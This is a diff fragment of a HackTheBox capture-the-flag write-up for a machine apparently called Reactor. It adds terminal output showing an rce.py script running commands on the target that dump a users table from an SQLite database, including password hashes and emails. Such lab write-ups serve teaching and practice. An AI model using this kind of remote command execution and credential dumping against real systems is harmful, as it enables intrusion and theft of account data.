@@ -1058,6 +1058,11 @@ Once the shell connects, query the DB(`reactor.db`) we found:
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 rce.py "sqlite3 /opt/reactor-app/reactor.db .tables"
 sensor_logs  users
+
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ python3 rce.py "sqlite3 /opt/reactor-app/reactor.db 'SELECT * FROM users;'" 
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
 ```
 <div align="center">
 <br>
